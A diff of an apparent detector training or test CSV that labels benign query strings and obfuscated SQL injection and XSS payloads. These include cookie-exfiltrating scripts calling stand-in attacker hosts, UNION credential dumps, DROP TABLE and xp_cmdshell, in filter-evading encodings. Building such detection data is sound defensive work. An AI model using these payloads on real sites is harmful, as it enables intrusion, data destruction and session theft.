@@ -3,9 +3,9 @@ payload,label,techniques
 sort=asc&ref=book,benign,
 %253Cstyle%253E%2540import%2520%2527http%253A%252F%252Fevil.example%252Fxss.css%2527%253B%253C%252Fstyle%253E,xss,case_toggle+double_url_encode+comment_insertion
 user_id=2057,benign,
-1%2527%2520AND%201%253D1%2520--,sqli,url_encode+partial_url_encode+comment_insertion
-&lt;script\u003Ealert%28'xss&#39;\u0029&#60;/script%3E,xss,unicode_substitution+case_toggle+whitespace
-<img src=x onerror=this.src=&#39;http://evil.example/'+document.cookie>,xss,unicode_substitution
+1%2527%20AND%201%253D1%20--,sqli,url_encode+partial_url_encode+comment_insertion
+<script\u003Ealert\u0028'xss&#39;)%3C/script\u003E,xss,unicode_substitution+case_toggle+whitespace
+%3Cimg src=x onerror=this.src=%27http://evil.example/'+document.cookie\u003E,xss,unicode_substitution
 currency=usd&lang=en&city=report,benign,
 category=delta&session=27f1637,benign,
 %27%20OR%20%271%27%3D%271,sqli,url_encode+case_toggle
@@ -18,34 +18,35 @@ name=settings&token=3bdf2a8,benign,
 category=camera,benign,
 price_max=8067&lang=en,benign,
 search=dashboard&tab=foxtrot,benign,
-%27 OR SLEEP%285%29%3D%270,sqli,partial_url_encode
+%27%20OR SLEEP%285%29='0,sqli,partial_url_encode
 limit=6276,benign,
 category=profile&size=m,benign,
-1%252527%252520And%2525201%25253D1%252520--,sqli,case_toggle+double_url_encode+url_encode
-admin%25252527%252520--,sqli,unicode_substitution+double_url_encode+url_encode
+1%252527%252520aNd%2525201%25253D1%252520--,sqli,case_toggle+double_url_encode+url_encode
+admin%25255Cu0027%252520--,sqli,unicode_substitution+double_url_encode+url_encode
 q=camera&price_min=3864&size=m,benign,
-%2527%2529%252509or%250A%2528%25271%2527%253D%25271,sqli,case_toggle+whitespace+double_url_encode
+%2527%2529%250AOr%2509%2528%25271%2527%253D%25271,sqli,case_toggle+whitespace+double_url_encode
 %25253Cscript%25253Enew%252520Image%252528%252529.src%25253D%252527http%25253A%25252F%25252Fc2.example%25252F%25253Fc%25253D%252527%25252Bdocument.cookie%25253B%25253C%25252Fscript%25253E,xss,double_url_encode+url_encode
 user_id=8038&city=settings,benign,
 theme=dark&coupon=dashboard,benign,
 color=foxtrot&email=jakarta@example.com,benign,
 view=grid&format=json&tab=foxtrot,benign,
 search=foxtrot&theme=dark,benign,
-%22 UNI/*!50000*/ON SELECT table_name%20FROM information_schema.tables --,sqli,partial_url_encode+comment_insertion
+"""%20UNION SEL/*!50000*/ECT%20table_name FROM information_schema.tables --",sqli,partial_url_encode+comment_insertion
 %25253Csvg%252520onload%25253Dalert%2525281%252529%25253E,xss,comment_insertion+url_encode+double_url_encode
 1%27%20AND%20SLEEP%287%29%20--,sqli,url_encode+comment_insertion
-1%2527%252F%252A%25252A%252FAND%2525091%25253D1%252509--,sqli,whitespace+partial_url_encode+double_url_encode
+1%2527%2525250aAND%25250A1%253D1%252509--,sqli,whitespace+partial_url_encode+double_url_encode
 category=settings,benign,
 price_min=9395&session=1847684,benign,
-"%27
-UNION%2F*%2A/SELECT%0Ausername%2C	password%0aFROM%250ausers%0A--",sqli,whitespace+partial_url_encode
+"%27%0aUNION
+SELECT%0Ausername,%09password
+FROM%2509users%2F%2A%2A/--",sqli,whitespace+partial_url_encode
 %3Csvg%20onload%3Dalert%281%29%3E,xss,url_encode
 tab=invoice&color=invoice,benign,
 price_min=5978,benign,
 price_min=5254&price_max=2348,benign,
 %3Cdetails%20open%20ontoggle%3Dalert%281%29%3E,xss,url_encode
 %2527%2520UNION%2520SELECT%2520NULL%252C%2520NULL%252C%2520NULL%2520--,sqli,double_url_encode
-%2526%252360%253Ba%252520href%253D%252522javascript%25253Aalert%2525281%255Cu0029%252522%2526%252362%253Bclick%255Cu003C%25252Fa%2526gt%253B,xss,partial_url_encode+unicode_substitution+double_url_encode
+%253Ca%252520href%253D%252522javascript%253Aalert%25281%255Cu0029%252522%25253Eclick%25253C%252Fa%255Cu003E,xss,partial_url_encode+unicode_substitution+double_url_encode
 %2522%2520UNION%2520SELECT%2520table_name%2520FROM%2520information_schema.tables%2520--,sqli,double_url_encode+unicode_substitution
 color=foxtrot,benign,
 user_id=169,benign,
@@ -53,7 +54,7 @@ user_id=169,benign,
 %2527%253B%2520DROP%2520TABLE%2520users%253B%2520--,sqli,double_url_encode+comment_insertion
 email=phone@example.com&page=9985&currency=usd,benign,
 coupon=delta,benign,
-<iframe src=javascript:alert(1)>,xss,case_toggle
+%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E,xss,case_toggle+fallback_full_url_encode
 tab=camera&price_min=2833&size=m,benign,
 qty=5543,benign,
 q=jakarta&coupon=jakarta&limit=6746,benign,
@@ -61,67 +62,70 @@ coupon=report,benign,
 redirect=/home&qty=8043&color=phone,benign,
 category=dashboard,benign,
 user_id=999&offset=2870,benign,
-"'
-OR%0a'1'='1",sqli,whitespace
-%27\u003E&lt;script\u003Ealert%281)&lt;/script&gt;,xss,whitespace+comment_insertion+unicode_substitution
+'/**/OR%0a'1'='1,sqli,whitespace
+&#39;%3E&lt;script\u003Ealert\u00281\u0029%3C/script&gt;,xss,whitespace+comment_insertion+unicode_substitution
 tab=dashboard&size=m,benign,
 %253Cscript%253Ealert%2528document.cookie%2529%253C%252Fscript%253E,xss,double_url_encode+whitespace+unicode_substitution
 session=3e68086,benign,
-<svg onload=alert(1)>,xss,comment_insertion
-%252522%25253E%253Cscript%253Ealert%2525281%252529%253C%252Fscript%25253E,xss,partial_url_encode+double_url_encode
-\u0027 OR%20EXISTS%28seLEcT * FROM%20users\u0029%20--,sqli,case_toggle+partial_url_encode+unicode_substitution
-%3Cscript>eval(atob%28%27YWxlcnQoMSk%3D%27)%29</script>,xss,partial_url_encode+comment_insertion+case_toggle
+%3Csvg%20onload%3Dalert%281%29%3E,xss,comment_insertion+fallback_full_url_encode
+%2522%253E%253Cscript%253Ealert%2525281%2529%253C%252Fscript%253E,xss,partial_url_encode+double_url_encode
+&#39; oR%20EXISTS%28SeLECt%20%2A From%20users%29%20--,sqli,case_toggle+partial_url_encode+unicode_substitution
+%3Cscript%3Eeval(atob%28%27YWxlcnQoMSk%3D%27))<%2Fscript%3E,xss,partial_url_encode+comment_insertion+case_toggle
 qty=4531&view=grid,benign,
 sort=desc&theme=dark&color=alice,benign,
 page=268&user_id=4946&price_max=3636,benign,
 ref=dashboard&name=phone&qty=5119,benign,
 1%20OR%201%3D1,sqli,url_encode+whitespace
 %253Cscript%253Ealert%2528document.cookie%2529%253C%252Fscript%253E,xss,double_url_encode+whitespace
-%27%2509AND%2509%28SELECT%0ACOUNT%28%2A%29%2509FROM%09users%29%2F%2A%2A%2F%3E%250a0%2F%2A%2A%2F--,sqli,whitespace+url_encode
+%27%0AAND%2F%2A%2A%2F%28SELECT%09COUNT%28%2A%29%2509FROM%0Ausers%29%09%3E%2F%2A%2A%2F0%2F%2A%2A%2F--,sqli,whitespace+url_encode
 session=3691889&callback=profile,benign,
-\u0027 OR %271'=\u00271,sqli,unicode_substitution
-<input onfocus=alert(1) autofocus>,xss,comment_insertion
-%2527%2509OR%25091%253D1%250A--,sqli,whitespace+double_url_encode+case_toggle
-%27%20OR '1%27%3D'1,sqli,partial_url_encode
+&#39; OR '1%27=%271,sqli,unicode_substitution
+%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,xss,comment_insertion+fallback_full_url_encode
+%2527%252509OR%25250a1%253D1%25250a--,sqli,whitespace+double_url_encode+case_toggle
+' OR '1'%3D%271,sqli,partial_url_encode
 %253Cdiv%2520onmouseover%253Dalert%25281%2529%253Ehover%253C%252Fdiv%253E,xss,double_url_encode
 page=9823,benign,
 sort=asc&id=9728,benign,
 page=2522&lang=id&color=delta,benign,
 sort=desc&offset=2206,benign,
-&#39;%09OR/**/SLEEP(6\u0029='0,sqli,unicode_substitution+whitespace
+\u0027%0aOR	SLEEP\u00286)='0,sqli,unicode_substitution+whitespace
 name=orders&sort=desc,benign,
-"""
-uniOn/%2A%2A/sElECt%2509table_name%09FROM%250ainformation_schema.tables%09--",sqli,whitespace+case_toggle+partial_url_encode
-<iframe src=javascript:alert(1)>,xss,case_toggle
-%25253Cscript%253Ealert%252528%252527xss%252527%2529%25253C%252Fscript%25253E,xss,double_url_encode+partial_url_encode+case_toggle
-%27%20AND%20%28SELECT%20COUNT(%2A%29/**/from%20users%29%0a>%200%20--,sqli,partial_url_encode+case_toggle+whitespace
+"""%250aUNION/**/selECT%09table_name%0aFROM/*%2A%2Finformation_schema.tables%09--",sqli,whitespace+case_toggle+partial_url_encode
+%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E,xss,case_toggle+fallback_full_url_encode
+%253Cscript%25253Ealert%252528%252527xss%2527%2529%253C%25252Fscript%253E,xss,double_url_encode+partial_url_encode+case_toggle
+"%27
+and%20%28SELECT%20COUNT(%2A)	FroM%20users)	>	0%20--",sqli,partial_url_encode+case_toggle+whitespace
 page=6437,benign,
 price_max=8971&ref=invoice&city=citra,benign,
 %25253Cvideo%25253E%25253Csource%252520onerror%25253Dalert%2525281%252529%25253E%25253C%25252Fvideo%25253E,xss,case_toggle+url_encode+double_url_encode
-%3Cscript%3Edocument.location=%27http:/%2Fevil.example/%27%2Bdocument.cookie%3C%2Fscript%3E,xss,whitespace+partial_url_encode+case_toggle
-%2527%2520GROUP%252520BY%2520password%2520HAVING%2525201%25253D1%2520--,sqli,double_url_encode+unicode_substitution+partial_url_encode
-%253Cmarquee%2520onstart%3Dalert%25281%2529%3E,xss,url_encode+unicode_substitution+partial_url_encode
+%3Cscript>document.location='http:/%2Fevil.example%2F'%2Bdocument.cookie<%2Fscript%3E,xss,whitespace+partial_url_encode+case_toggle
+%2527%252520GROUP%2520BY%2520password%2520HAVING%2525201%25253D1%252520--,sqli,double_url_encode+unicode_substitution+partial_url_encode
+%253Cmarquee%20onstart%3Dalert%281%29%3E,xss,url_encode+unicode_substitution+partial_url_encode
 callback=invoice,benign,
-admin' --,sqli,partial_url_encode
+admin%27 --,sqli,partial_url_encode
 lang=en&callback=delta,benign,
 theme=dark&price_min=1103&sort=desc,benign,
 %253Cscript%253Ealert%2528%2527xss%2527%2529%253C%252Fscript%253E,xss,case_toggle+comment_insertion+double_url_encode
-"%27	UN/*!50000*/ION	SELECT
-NULL,/**/NULL,/**/NULL	--",sqli,whitespace+unicode_substitution+comment_insertion
+"\u0027%09UNION/**/SEL/**/ECT
+NULL,%0aNULL,	NULL%0a--",sqli,whitespace+unicode_substitution+comment_insertion
 page=9373&price_min=3644&format=json,benign,
-"'/**/AND%09(SELECT/**/COUNT(*)	FROM/**/users)/**/>
-0/**/--",sqli,whitespace
-1%3B%20eXEc%20xp_cmdshell%28'dir')%20--,sqli,case_toggle+partial_url_encode+whitespace
+"'	AND
+(SELECT%0aCOUNT(*)/**/FROM
+users)	>%090
+--",sqli,whitespace
+"1%3B
+EXEc%0axp_cmdshell('dir'%29
+--",sqli,case_toggle+partial_url_encode+whitespace
 color=shoes&city=shoes&view=grid,benign,
-<script>new Image().src='http://bad-host.example/?c='+document.cookie;</script>,xss,comment_insertion
+%3Cscript%3Enew%20Image%28%29.src%3D%27http%3A%2F%2Fbad-host.example%2F%3Fc%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E,xss,comment_insertion+fallback_full_url_encode
 redirect=/home&lang=en&q=jakarta,benign,
 lang=en,benign,
 city=budi&redirect=/home,benign,
-<script>alert(document.cookie)</script>,xss,comment_insertion
+%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E,xss,comment_insertion+fallback_full_url_encode
 id=6671&offset=9153&search=orders,benign,
-<script>new	Image().src='http://c2.example/?c='+document.cookie;</script>,xss,case_toggle+whitespace
+<script>new%0aImage().src='http://c2.example/?c='+document.cookie;</script>,xss,case_toggle+whitespace
 session=3208a8c&price_min=2955,benign,
-<marquee onstart=alert(1)>,xss,comment_insertion+case_toggle
+%3Cmarquee%20onstart%3Dalert%281%29%3E,xss,comment_insertion+case_toggle+fallback_full_url_encode
 city=echo&coupon=phone,benign,
 session=4449da7&currency=usd,benign,
 email=orders@example.com&token=3268c40,benign,
@@ -131,55 +135,58 @@ token=57ca662&search=phone&price_max=7998,benign,
 %3Cscript%3Eeval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3C%2Fscript%3E,xss,url_encode
 1%27%20AND%201%3D1%20--,sqli,url_encode+comment_insertion
 size=m&offset=3081&user_id=2239,benign,
-%2527%252F%252A%252A%252FHAVING%252F%252A%252A%252F1%253D1%252509--,sqli,whitespace+double_url_encode
+%2527%250AHAVING%25250a1%253D1%252509--,sqli,whitespace+double_url_encode
 ref=delta,benign,
 user_id=558&offset=1507&category=foxtrot,benign,
 qty=7553,benign,
 ref=citra&price_max=9065,benign,
-1; EX/*!50000*/EC xp_cmdshell%28%27dir%27%29 --,sqli,partial_url_encode+comment_insertion+unicode_substitution
-%2522%2520uNIon%2520SeLect%2520table_name%2520FRoM%2520information_schema.tables%2520--,sqli,case_toggle+double_url_encode
-%27%20OR '1'=%271,sqli,partial_url_encode
+1%3B%20EXEC xp_cmdshell%28%27dir%27%29%20--,sqli,partial_url_encode+comment_insertion+unicode_substitution
+%2522%2520UNIon%2520SelECT%2520table_name%2520FrOm%2520information_schema.tables%2520--,sqli,case_toggle+double_url_encode
+%27 OR%20'1'%3D%271,sqli,partial_url_encode
 city=report&view=grid,benign,
 admin%27%20--,sqli,url_encode+case_toggle
 sort=asc&size=m,benign,
 format=json&limit=5027,benign,
-<style>@import 'http://evil.example/xss.css';</style>,xss,case_toggle+comment_insertion
+%3Cstyle%3E%40import%20%27http%3A%2F%2Fevil.example%2Fxss.css%27%3B%3C%2Fstyle%3E,xss,case_toggle+comment_insertion+fallback_full_url_encode
 offset=3372,benign,
 %22%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables%20--,sqli,url_encode
 %253Cscript%253Enew%2520Image%2528%2529.src%253D%2527http%253A%252F%252Fevil.example%252F%253Fc%253D%2527%252Bdocument.cookie%253B%253C%252Fscript%253E,xss,double_url_encode+unicode_substitution
 size=m&theme=dark,benign,
 %27%20HAVING%201%3D1 --,sqli,partial_url_encode
 %25253Cimg%252520src%25253Dx%252520onerror%25253Dthis.src%25253D%252527http%25253A%25252F%25252Fevil.example%25252F%252527%25252Bdocument.cookie%25253E,xss,url_encode+double_url_encode+comment_insertion
-&lt;script>fetch%28&#39;http://evil.example/steal?c='+document.cookie%29\u003C/script%3E,xss,whitespace+unicode_substitution
+&lt;script%3Efetch\u0028\u0027http://evil.example/steal?c=%27+document.cookie\u0029&lt;/script&#62;,xss,whitespace+unicode_substitution
 lang=en&sort=desc&redirect=/home,benign,
 city=settings,benign,
 %2527%2520OR%2520%25271%2527%253D%25271,sqli,double_url_encode+comment_insertion
 %3Cmarquee%20onstart%3Dalert%281%29%3E,xss,url_encode+comment_insertion+case_toggle
-&lt;marquee onstart=alert%281\u0029%3E,xss,case_toggle+unicode_substitution+comment_insertion
+\u003Cmarquee onstart=alert(1%29&gt;,xss,case_toggle+unicode_substitution+comment_insertion
 tab=surakarta&redirect=/home&email=budget@example.com,benign,
 %2527%2529%2520OR%2520%2528%25271%2527%253D%25271,sqli,double_url_encode+case_toggle+whitespace
 tab=shoes&limit=7787,benign,
 limit=9799,benign,
-<video>%3Csource	onerror=alert%281%29>%3C/video>,xss,whitespace+partial_url_encode+comment_insertion
+<video>%3Csource%2F**/onerror%3Dalert(1%29><%2Fvideo%3E,xss,whitespace+partial_url_encode+comment_insertion
 qty=2000&format=json&lang=id,benign,
 user_id=622&search=foxtrot&email=citra@example.com,benign,
 limit=2718&theme=dark&qty=9280,benign,
-%3Csvg%2520onload%253Dalert%25281%29%253E,xss,partial_url_encode+url_encode+case_toggle
+%253Csvg%2520onload%3Dalert%281%2529%253E,xss,partial_url_encode+url_encode+case_toggle
 sort=desc&view=grid&q=orders,benign,
 %253Ciframe%2520src%253Djavascript%253Aalert%25281%2529%253E,xss,double_url_encode+whitespace
 sort=desc&view=grid&lang=id,benign,
 redirect=/home&color=echo,benign,
-%27%20OR/**/2%3D7%20--,sqli,partial_url_encode+whitespace
-'/**/OR/**/'a'='a,sqli,whitespace
-<script>document.location=%27http://attacker.test/&#39;+document.cookie</script>,xss,comment_insertion+unicode_substitution
-admin&#39; --,sqli,unicode_substitution
+"%27
+OR%202%3D7%20--",sqli,partial_url_encode+whitespace
+"'
+OR/**/'a'='a",sqli,whitespace
+&lt;script%3Edocument.location=%27http://attacker.test/&#39;+document.cookie</script\u003E,xss,comment_insertion+unicode_substitution
+admin\u0027 --,sqli,unicode_substitution
 user_id=7439&format=json&theme=dark,benign,
 callback=citra,benign,
-admin'%0a--,sqli,whitespace+comment_insertion
+"admin'
+--",sqli,whitespace+comment_insertion
 sort=desc&price_min=5655,benign,
 ref=citra&token=4754d96,benign,
 color=budget&category=laptop&price_min=8822,benign,
-'; DR/*!50000*/OP tAble users; --,sqli,unicode_substitution+comment_insertion+case_toggle
+%27; DR/*!50000*/OP TaBLE users; --,sqli,unicode_substitution+comment_insertion+case_toggle
 %253Cscript%253Enew%2520Image%2528%2529.src%253D%2527http%253A%252F%252Fattacker.test%252F%253Fc%253D%2527%252Bdocument.cookie%253B%253C%252Fscript%253E,xss,case_toggle+double_url_encode
 %3Cscript%3Enew%20Image%28%29.src%3D%27http%3A%2F%2Fevil.example%2F%3Fc%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E,xss,url_encode+comment_insertion
 qty=4067&user_id=6819&sort=asc,benign,
@@ -188,18 +195,18 @@ admin%2527%2520--,sqli,double_url_encode
 price_min=7224&q=surakarta,benign,
 user_id=6825,benign,
 q=settings,benign,
-1%252527%2520aNd%2520SLEEP%25285%2529%252520--,sqli,partial_url_encode+case_toggle+double_url_encode
+1%252527%2520anD%2520SLEEP%25285%252529%252520--,sqli,partial_url_encode+case_toggle+double_url_encode
 price_min=9791,benign,
-%27%20UNION%20SELECT%2520NULL%252C%20NULL%252C%2520NULL%2520--,sqli,url_encode+partial_url_encode+comment_insertion
+%27%20UNION%2520SELECT%2520NULL%252C%2520NULL%252C%20NULL%2520--,sqli,url_encode+partial_url_encode+comment_insertion
 %2527%2520UNION%2520SELECT%2520NULL%252C%2520NULL%252C%2520NULL%2520--,sqli,double_url_encode+case_toggle
-'/**/GROUP/**/BY%09password/**/HAVING%095=9%09--,sqli,whitespace
-<script>eval(atob('YWxlcnQoMSk='))</script>,xss,comment_insertion+whitespace
+'	GROUP%0aBY%0apassword/**/HAVING%0a5=9%0a--,sqli,whitespace
+%3Cscript%3Eeval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3C%2Fscript%3E,xss,comment_insertion+whitespace+fallback_full_url_encode
 qty=5734,benign,
 theme=dark&size=m,benign,
-&lt;body onload=alert\u0028%27xss&#39;\u0029\u003E,xss,unicode_substitution
+%3Cbody onload=alert%28'xss')\u003E,xss,unicode_substitution
 id=2469&limit=3559&sort=asc,benign,
-%3Cdetails%2509open%2F%2A%2A%2Fontoggle%3Dalert%281%29%3E,xss,whitespace+comment_insertion+url_encode
-<body	onload=alert%28&#39;xss%27%29>,xss,unicode_substitution+case_toggle+whitespace
+%3Cdetails%250aopen%2509ontoggle%3Dalert%281%29%3E,xss,whitespace+comment_insertion+url_encode
+&#60;body%09onload=alert\u0028'xss%27%29>,xss,unicode_substitution+case_toggle+whitespace
 tab=report&name=shoes&color=shoes,benign,
 lang=en&city=orders,benign,
 token=2ed1640&format=json,benign,
@@ -212,39 +219,35 @@ callback=dashboard&size=m,benign,
 email=settings@example.com&id=6866,benign,
 format=json&token=3573626&lang=en,benign,
 format=json&coupon=book,benign,
-%2527%2509AND%2509%2528SELECT%252509COUNT%2528%252A%2529%250AFROM%25250ausers%2529%25250a%253E%25090%252F%252A%252A%252F--,sqli,comment_insertion+whitespace+double_url_encode
+%2527%252509AND%2509%2528SELECT%252509COUNT%2528%252A%2529%25250aFROM%2509users%2529%250A%253E%250A0%25250a--,sqli,comment_insertion+whitespace+double_url_encode
 sort=desc&format=json&page=1670,benign,
 format=json&color=citra,benign,
 page=3269,benign,
-1' AND 2=2 --,sqli,comment_insertion
+1%27%20AND%202%3D2%20--,sqli,comment_insertion+fallback_full_url_encode
 category=orders&ref=jakarta&price_min=4307,benign,
 %3Cstyle%3E%40import%20%27http%3A%2F%2Fevil.example%2Fxss.css%27%3B%3C%2Fstyle%3E,xss,url_encode
-<img	src=x%0aonerror=alert(1)>,xss,whitespace
+<img%09src=x%09onerror=alert(1)>,xss,whitespace
 %3Cscript%3Eeval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3C%2Fscript%3E,xss,url_encode
 qty=3044&ref=book&session=12f212c,benign,
-"\u0027	GROUP%09BY
-password%09HAVING	1=1%09--",sqli,whitespace+case_toggle+unicode_substitution
-"""%0aUnION%0aSeLeCt/**/table_name/**/fRoM
-information_schema.tables
---",sqli,unicode_substitution+case_toggle+whitespace
-%3Cscript&#62;fetch\u0028'http://evil.example/steal?c='+document.cookie%29&lt;/script%3E,xss,unicode_substitution
+"%27%0aGROUP%09BY/**/password
+HAVING%0a1=1/**/--",sqli,whitespace+case_toggle+unicode_substitution
+%22%0auNion/**/SElect/**/table_name	fROM/**/information_schema.tables%0a--,sqli,unicode_substitution+case_toggle+whitespace
+&lt;script\u003Efetch\u0028&#39;http://evil.example/steal?c='+document.cookie)</script%3E,xss,unicode_substitution
 qty=603&lang=id,benign,
-""" Or ""1""=""1",sqli,case_toggle
-1%2509OR/*%2A/1%3D1,sqli,whitespace+partial_url_encode+case_toggle
+""" or ""1""=""1",sqli,case_toggle
+1%0aOR	1%3D1,sqli,whitespace+partial_url_encode+case_toggle
 user_id=6132&search=alice&sort=desc,benign,
 email=phone@example.com,benign,
-<marquee onstart=alert(1)>,xss,case_toggle
+%3Cmarquee%20onstart%3Dalert%281%29%3E,xss,case_toggle+fallback_full_url_encode
 lang=en&price_max=2911,benign,
-"'
-OR/**/'a'='a",sqli,comment_insertion+whitespace
-%27 Or EXISTS(seLEcT * FRom users) --,sqli,case_toggle+unicode_substitution
+'	OR	'a'='a,sqli,comment_insertion+whitespace
+&#39; Or EXISTS%28SeLEct * froM users\u0029 --,sqli,case_toggle+unicode_substitution
 session=3aa6d07&price_max=6932,benign,
 %25253Csvg%252520onload%25253Dalert%2525281%252529%25253E,xss,url_encode+double_url_encode+whitespace
 1%2527%2520AND%25201%253D1%2520--,sqli,comment_insertion+double_url_encode
 %2527%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E,xss,double_url_encode+unicode_substitution
 callback=foxtrot&token=4d85b7b,benign,
-"<img
-src=x/**/onerror=alert(1)>",xss,whitespace+comment_insertion
+<img%09src=x	onerror=alert(1)>,xss,whitespace+comment_insertion
 %253Cscript%253Eeval%2528atob%2528%2527YWxlcnQoMSk%253D%2527%2529%2529%253C%252Fscript%253E,xss,double_url_encode
 email=surakarta@example.com&page=8420,benign,
 offset=6956&tab=jakarta&sort=asc,benign,
@@ -259,88 +262,88 @@ coupon=book&callback=report,benign,
 %253Cinput%2520onfocus%253Dalert%25281%2529%2520autofocus%253E,xss,double_url_encode
 q=surakarta,benign,
 redirect=/home&sort=asc,benign,
-%2522%3E%3Cscript%3Ealert%25281%2529%3C%2Fscript%253E,xss,comment_insertion+partial_url_encode+url_encode
+%22%3E%3Cscript%253Ealert%25281%29%253C%252Fscript%253E,xss,comment_insertion+partial_url_encode+url_encode
 %3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,xss,url_encode+comment_insertion+unicode_substitution
 %27%29%20OR%20%28%271%27%3D%271,sqli,comment_insertion+url_encode
 token=1aeefb9,benign,
 admin&#39; --,sqli,comment_insertion+unicode_substitution
-"<style>@import
-\u0027http://evil.example/xss.css%27;&#60;/style>",xss,comment_insertion+unicode_substitution+whitespace
-%2527%20or%2520SLEEP%289%2529%3D%270,sqli,case_toggle+url_encode+partial_url_encode
-1%3B%20EX%2F%2A%2150000%2A%2FEC%20xp_cmdshell%5Cu0028%26%2339%3Bdir%27%2529%20--,sqli,unicode_substitution+comment_insertion+url_encode
+"&lt;style%3E@import
+'http://evil.example/xss.css&#39;;</style&#62;",xss,comment_insertion+unicode_substitution+whitespace
+%2527%2520oR%2520SLEEP%289%2529%3D%270,sqli,case_toggle+url_encode+partial_url_encode
+1%3B%20EX%2F%2A%2150000%2A%2FEC%20xp_cmdshell%2528%5Cu0027dir%2527%2529%20--,sqli,unicode_substitution+comment_insertion+url_encode
 token=1d0b159&lang=en,benign,
 format=json,benign,
 %2527%2520UNION%2520SELECT%2520username%252C%2520password%2520FROM%2520users%2520--,sqli,double_url_encode+case_toggle
-1&#39; AND 1=1 --,sqli,unicode_substitution
+1\u0027 AND 1=1 --,sqli,unicode_substitution
 search=book&offset=7430&user_id=5299,benign,
 category=budget&email=echo@example.com&lang=id,benign,
 city=invoice,benign,
-%27 GROUP BY password HAVING 1=1 --,sqli,unicode_substitution+case_toggle
-%27 HAVING 1%3D1 --,sqli,partial_url_encode+case_toggle
+&#39; GROUP BY password HAVING 1=1 --,sqli,unicode_substitution+case_toggle
+%27 HAVING%201=1%20--,sqli,partial_url_encode+case_toggle
 lang=en&session=3075331&lang=id,benign,
 redirect=/home&limit=6930&lang=en,benign,
 name=dashboard&theme=dark,benign,
-%252527%252520OR%2525201%2525253D1%25252523,sqli,partial_url_encode+url_encode+double_url_encode
+%25252527%25252520OR%252525201%25253D1%25252523,sqli,partial_url_encode+url_encode+double_url_encode
 %27%20OR%20%271%27%3D%271,sqli,url_encode+comment_insertion+unicode_substitution
 limit=4061&search=shoes&sort=desc,benign,
 redirect=/home&offset=302&city=shoes,benign,
 name=profile&offset=1295&view=grid,benign,
 callback=profile,benign,
 sort=asc&tab=alice,benign,
-<img%0asrc=x/**/onerror=alert(1)>,xss,case_toggle+whitespace
+"<img
+src=x	onerror=alert(1)>",xss,case_toggle+whitespace
 size=m&format=json,benign,
 %2522%2520UNION%2520SELECT%2520table_name%2520FROM%2520information_schema.tables%2520--,sqli,double_url_encode+unicode_substitution+comment_insertion
 user_id=6392,benign,
 search=dashboard&city=report&lang=en,benign,
-%5Cu003Cscript%26%2362%3Bfetch%2528%2527http%3A%2F%2Fbad-host.example%2Fsteal%3Fc%3D%26%2339%3B%2Bdocument.cookie%5Cu0029%3C%2Fscript%3E,xss,unicode_substitution+whitespace+url_encode
+%253Cscript%26%2362%3Bfetch%5Cu0028%27http%3A%2F%2Fbad-host.example%2Fsteal%3Fc%3D%5Cu0027%2Bdocument.cookie%5Cu0029%26%2360%3B%2Fscript%253E,xss,unicode_substitution+whitespace+url_encode
 color=orders,benign,
 q=echo&qty=2807,benign,
 sort=asc&price_min=3240&offset=1507,benign,
-%25253Cscript%25253Edocument.location%25253D%2527http%25253A%252F%252Fattacker.test%252F%252527%252Bdocument.cookie%253C%25252Fscript%253E,xss,partial_url_encode+double_url_encode+case_toggle
+%25253Cscript%25253Edocument.location%253D%2527http%25253A%25252F%25252Fattacker.test%25252F%2527%25252Bdocument.cookie%25253C%25252Fscript%25253E,xss,partial_url_encode+double_url_encode+case_toggle
 size=m&category=settings,benign,
 %22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E,xss,case_toggle+url_encode+unicode_substitution
-"'	OR
-SLEEP(6)='0",sqli,whitespace
+'	OR/**/SLEEP(6)='0,sqli,whitespace
 view=grid&id=9503&user_id=5280,benign,
 ref=budget&qty=1735&session=3d02b68,benign,
 limit=4730&city=budi,benign,
-<input onfocus=alert(1\u0029 autofocus\u003E,xss,unicode_substitution
+&#60;input onfocus=alert%281%29 autofocus\u003E,xss,unicode_substitution
 city=surakarta,benign,
-';%20DROP taBlE users; --,sqli,partial_url_encode+case_toggle
+'; dROp TaBle%20users;%20--,sqli,partial_url_encode+case_toggle
 session=14677d1&format=json&currency=usd,benign,
 format=json&page=1443&price_max=6862,benign,
 sort=desc&name=budget&category=profile,benign,
-&#60;script>document.location%3D&#39;http:%2F/c2.example%2F'+document.cookie%3C/script\u003E,xss,partial_url_encode+comment_insertion+unicode_substitution
-%3Ciframe%2520src%3Djavascript%3Aalert%25281%29%3E,xss,url_encode+partial_url_encode+case_toggle
+%3Cscript%3Edocument.location%3D%27http:%2F/c2.example%2F%27%2Bdocument.cookie&lt;/script%3E,xss,partial_url_encode+comment_insertion+unicode_substitution
+%3Ciframe%2520src%253Djavascript%253Aalert%281%2529%253E,xss,url_encode+partial_url_encode+case_toggle
 callback=laptop&token=5b871e8&limit=7743,benign,
-%2527%253B%2520DROP%2520TABLE%20users%3B%20--,sqli,partial_url_encode+url_encode+comment_insertion
+%27%253B%20DROP%20TABLE%20users%3B%2520--,sqli,partial_url_encode+url_encode+comment_insertion
 size=m&color=camera,benign,
 ref=laptop,benign,
-%27 OR SLEEP\u00285%29=\u00270,sqli,unicode_substitution
+%27 OR SLEEP%285\u0029='0,sqli,unicode_substitution
 price_min=1770&category=book,benign,
-%3Cbody%20onload=alert(%27xss%27%29%3E,xss,partial_url_encode
+%3Cbody%20onload=alert('xss')%3E,xss,partial_url_encode
 session=256cc62&lang=en,benign,
 format=json&price_min=6036,benign,
 callback=foxtrot&token=248db1d&redirect=/home,benign,
 view=grid&color=jakarta,benign,
 %253Cvideo%253E%253Csource%2520onerror%253Dalert%25281%2529%253E%253C%252Fvideo%253E,xss,double_url_encode+case_toggle
 id=9078&lang=id,benign,
-%3Cinput%20onfocus%3Dalert%25281%29%20autofocus%253E,xss,comment_insertion+url_encode+partial_url_encode
+%3Cinput%2520onfocus%3Dalert%25281%2529%2520autofocus%3E,xss,comment_insertion+url_encode+partial_url_encode
 user_id=9469&ref=orders&price_max=9344,benign,
